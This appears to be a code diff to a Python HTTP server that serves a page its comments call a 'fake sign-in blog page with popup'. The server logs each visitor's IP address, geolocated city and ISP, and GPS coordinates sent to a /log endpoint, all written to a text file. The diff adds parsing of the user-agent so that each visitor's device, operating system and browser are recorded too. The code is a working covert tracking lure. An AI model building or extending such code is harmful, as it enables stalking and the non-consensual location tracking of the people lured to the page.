@@ -2,8 +2,9 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import logging
 import requests
 import urllib.parse as urlparse
+from user_agents import parse
 
-# HTML for the fake blog sign-in page with custom popup
+# HTML for the fake sign-in blog page with popup
 html = """
 <html>
 <head>
@@ -71,6 +72,10 @@ html = """
 
 class IPLoggerHandler(BaseHTTPRequestHandler):
     def do_GET(self):
+        user_agent_str = self.headers.get('User-Agent', 'Unknown')
+        ua = parse(user_agent_str)
+        device_info = f"{ua.device.family} / {ua.os.family} {ua.os.version_string} / {ua.browser.family} {ua.browser.version_string}"
+
         # --- Handle GPS logging ---
         if self.path.startswith("/log?"):
             query = urlparse.urlparse(self.path).query
@@ -78,7 +83,7 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
             lat = params.get("lat", ["Unknown"])[0]
             lon = params.get("lon", ["Unknown"])[0]
             acc = params.get("accuracy", ["Unknown"])[0]
-            log_entry = f"GPS Coordinates: {lat},{lon} | Accuracy: {acc}m"
+            log_entry = f"GPS Coordinates: {lat},{lon} | Accuracy: {acc}m | Device: {device_info}"
             logging.info(log_entry)
             with open("ips.txt", "a") as f:
                 f.write(log_entry + "\n")
@@ -101,7 +106,7 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
         except Exception:
             city = region = country = org = loc = "Unavailable"
 
-        log_entry = f"IP: {client_ip} | {city}, {region}, {country} | ISP: {org} | Approx. Coordinates: {loc}"
+        log_entry = f"IP: {client_ip} | {city}, {region}, {country} | ISP: {org} | Device: {device_info} | Approx. Coordinates: {loc}"
         logging.info(log_entry)
         with open("ips.txt", "a") as f:
             f.write(log_entry + "\n")
